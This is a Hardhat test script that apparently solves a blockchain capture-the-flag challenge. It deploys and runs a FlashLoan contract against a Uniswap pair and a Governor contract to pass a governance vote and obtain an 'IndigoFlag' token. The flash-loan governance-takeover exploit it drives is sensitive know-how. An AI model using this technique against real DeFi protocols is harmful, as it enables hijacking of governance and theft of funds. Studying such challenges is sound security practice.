require('dotenv').config();
const { assert } = require("chai");
const { abi: pairAbi } = require("@uniswap/v2-core/build/IUniswapV2Pair.json");

describe("Buffalol", function () {
  let signer0;
  let token;
  let wallet;
  beforeEach(async () => {
    wallet = new ethers.Wallet(process.env.PRIVATE_KEY, ethers.provider);
    [signer0] = await ethers.getSigners();

    token = await ethers.getContractAt("Buffalol", "0x2c9090cEFC236040D87CFFE8292d90e4c92f5728");
  });

  describe("uniswap pair", () => {
    let pair;
    beforeEach(async () => {
      pair = await ethers.getContractAt(pairAbi, "0x816963ddfc3Cec2596EF29585c80bd4844f03A89");
    });

    it("should have liquidity", async () => {
      const { reserve0, reserve1 } = await pair.getReserves();
      assert(reserve0.gt(0));
      assert(reserve1.gt(0));
    });

    describe("attempting to pass a governance vote", () => {
      let governor, flashloan, challenge;
      beforeEach(async () => {
        governor = await ethers.getContractAt("Governor", "0x580468614Fa6D839e9e7f3bc5C325cEb67d7fFB1");

        challenge = await ethers.getContractAt("Challenge", "0xf46C51fD4034855ec5dFE1cc22A78FE0A8820efc");
        
        const FlashLoan = await ethers.getContractFactory("FlashLoan");
        flashloan = await FlashLoan.deploy(pair.address, token.address, governor.address, challenge.address);
        await flashloan.deployed();

        await token.connect(wallet).transfer(flashloan.address, ethers.utils.parseEther("4"));
        await flashloan.execute();
      });

      it("should complete the challenge", async () => {
        const flag = await ethers.getContractAt("IndigoFlag", "0xC95a07eADdEc282bFdF15e9422E88BE43f07D0b0");
        const balance = await flag.balanceOf(await signer0.getAddress());
        assert.isAbove(balance.toNumber(), 0);
      });
    });
  });
});

